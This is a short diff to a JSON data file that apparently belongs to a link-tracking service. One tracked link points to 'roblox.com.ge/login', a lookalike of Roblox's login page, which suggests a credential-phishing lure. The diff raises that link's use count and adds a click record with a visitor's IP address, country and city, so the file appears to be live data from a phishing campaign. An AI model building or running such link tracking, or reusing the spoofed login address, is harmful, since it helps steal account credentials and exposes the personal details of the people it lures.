@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1597,
+    "useCount": 1598,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12939,6 +12939,14 @@
       },
       {
         "timestamp": 1777494154786,
+        "ip": "5.173.220.10",
+        "country": "Poland",
+        "city": "Warsaw",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777494161404,
         "ip": "5.173.220.10",
         "country": "Poland",
         "city": "Warsaw",
